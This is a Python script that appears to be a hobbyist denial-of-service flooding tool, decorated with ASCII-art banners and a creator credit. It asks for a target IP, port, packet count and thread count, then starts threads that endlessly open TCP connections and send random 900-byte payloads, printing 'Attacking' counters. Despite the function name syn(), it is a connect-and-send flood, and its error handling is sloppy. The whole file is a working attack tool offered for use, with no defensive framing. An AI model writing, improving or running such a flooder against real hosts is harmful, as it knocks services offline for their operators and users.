
import random
import threading
import socket
import os
import time
from termcolor import colored

os.system('cls')
print(colored(r"""
 ____    __  __     _     __    __      __  __  __   ____    ____      
/\  _`\ /\ \/\ \  /' \  /'__`\ /\ \  __/\ \/\ \/\ \ /\  _`\ /\  _`\    
\ \ \L\ \ \ \_\ \/\_, \/\_\L\ \\ \ \/\ \ \ \ \ \/'/'\ \ \L\ \ \ \/\_\  
 \ \ ,__/\ \  _  \/_/\ \/_/_\_<_\ \ \ \ \ \ \ \ , <  \ \ ,__/\ \ \/_/_ 
  \ \ \/  \ \ \ \ \ \ \ \/\ \L\ \\ \ \_/ \_\ \ \ \\`\ \ \ \/  \ \ \L\ \
   \ \_\   \ \_\ \_\ \ \_\ \____/ \ `\___x___/\ \_\ \_\\ \_\   \ \____/

                              Created by ANONS.PH13WKPC""", 'red'))

print(colored("\n==================================================================\n", 'green'))
ip = str(input(colored("[+] IP: ",'green')))
port = int(input(colored("[+] Port: ",'green')))
packet = int(input(colored("[+] Packets: ",'green')))
thread = int(input(colored("[+] Threads: ",'green')))
time.sleep(1.5)

os.system('cls')
print(colored(r"""
    ___   __  __             __   _                
   /   | / /_/ /_____ ______/ /__(_)___  ____ _    
  / /| |/ __/ __/ __ `/ ___/ //_/ / __ \/ __ `/    
 / ___ / /_/ /_/ /_/ / /__/ ,< / / / / / /_/ / _ _ 
/_/  |_\__/\__/\__,_/\___/_/|_/_/_/ /_/\__, (_|_|_)
                                      /____/     
              
╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║
╚╝ ╚═╩═╩═╩═╝  ╚╝╚═╩═╝
              """,'green'))
print(colored("\n#######################################################################",'red'))
time.sleep(2)
print(colored("\n[+] Start......",'green'))
time.sleep(1)
print(colored("\n3",'green'))
time.sleep(1)
print(colored("\n2",'green'))
time.sleep(1)
print(colored("\n1",'green'))
time.sleep(1)
os.system('cls')

def syn():

    hevin = random._urandom(900)
    bb = int(0)
    while True:
        try:
            h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            h.connect((ip,port))
            h.send(hevin)
            for i in range(packet):
                h.send(hevin)
            bb += 1
            print(colored('[+] Attacking '+ip +'>>>Sent: '+str(bb), 'red'))
        except KeyboardInterrupt:
            h.close()
            print(colored("[+++] DONE !!!!", 'green'))
            pass
for b in range(thread):
    thread = threading.Thread(target=syn)
    thread.start()